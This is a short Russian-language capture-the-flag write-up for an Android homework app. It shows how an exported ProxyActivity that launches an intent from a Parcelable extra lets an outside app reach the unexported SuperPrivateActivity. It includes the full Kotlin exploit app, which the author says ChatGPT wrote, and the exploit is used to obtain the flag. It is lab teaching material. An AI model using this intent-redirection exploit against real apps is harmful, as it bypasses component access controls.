Посмотрим на манифест:

![image](/resourses/mobile8.png)

Видим, что SuperPrivateActivity не экспортирована, следовательно ее нельзя вызвать через adb. Однако есть экспортированная ProxyActivity. Глянем на ее код:

![image](/resourses/mobile9.png)

Видим, что она получает на вход ParcelableExtra, берет от него интент и стартует активити. Через adb дать parcelableExtra нельзя. Придется писать свое приложение. Идем в гости к чатгпт и просим написать нам приложение, которое с помощью прокси активити вызовет нам super private activity:

```kotlin
package com.example.myapplication

import android.content.ComponentName
import android.content.Intent
import android.os.Bundle
import androidx.activity.ComponentActivity


class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val superPrivateIntent = Intent()
        superPrivateIntent.setClassName(
            "com.yandex.shad.homework",
            "com.yandex.shad.homework.features.SuperPrivateActivity"
        )
        val intent = Intent()
        intent.putExtra("inner", superPrivateIntent)
        intent.setComponent(ComponentName("com.yandex.shad.homework", "com.yandex.shad.homework.features.ProxyActivity"))
        startActivity(intent)

    }
}
```

Запускаем, видим флаг. Спасибо, чатгпт.